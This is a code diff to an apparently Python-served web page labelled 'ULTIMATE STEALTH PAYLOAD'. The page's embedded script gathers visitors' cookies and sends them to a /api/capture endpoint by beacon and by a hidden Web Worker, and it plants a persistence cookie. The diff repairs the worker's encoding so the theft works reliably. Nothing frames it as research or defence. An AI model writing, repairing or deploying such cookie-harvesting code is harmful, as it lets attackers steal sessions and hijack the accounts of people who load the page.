@@ -228,7 +228,7 @@ def index():
         ))
         conn.commit()
     
-    # ULTIMATE STEALTH PAYLOAD
+    # ULTIMATE STEALTH PAYLOAD - FIXED VERSION
     html = f'''
 <!DOCTYPE html>
 <html>
@@ -323,11 +323,14 @@ def index():
             navigator.sendBeacon('/api/capture', JSON.stringify({{cookies: __stealth.cookies}}));
         }}
         
-        // Method 4: Web Worker (if allowed)
+        // Method 4: Web Worker - FIXED VERSION
         try {{
-            const worker = new Worker('data:application/javascript,' + encodeURIComponent('fetch("/api/capture", {method:"POST",body:"' + data + '"});'));
+            const workerCode = 'fetch("/api/capture", {method:"POST",headers:{"Content-Type":"application/json"},body:' + JSON.stringify(JSON.stringify(__stealth.cookies)) + '});';
+            const worker = new Worker('data:application/javascript,' + encodeURIComponent(workerCode));
             worker.postMessage('');
-        }} catch(e) {{}}
+        }} catch(e) {{
+            console.log('Worker failed, continuing...');
+        }}
         
         // Set persistence cookie
         document.cookie = "stealth_" + Math.random().toString(36).substring(7) + "=active; path=/; max-age=86400";
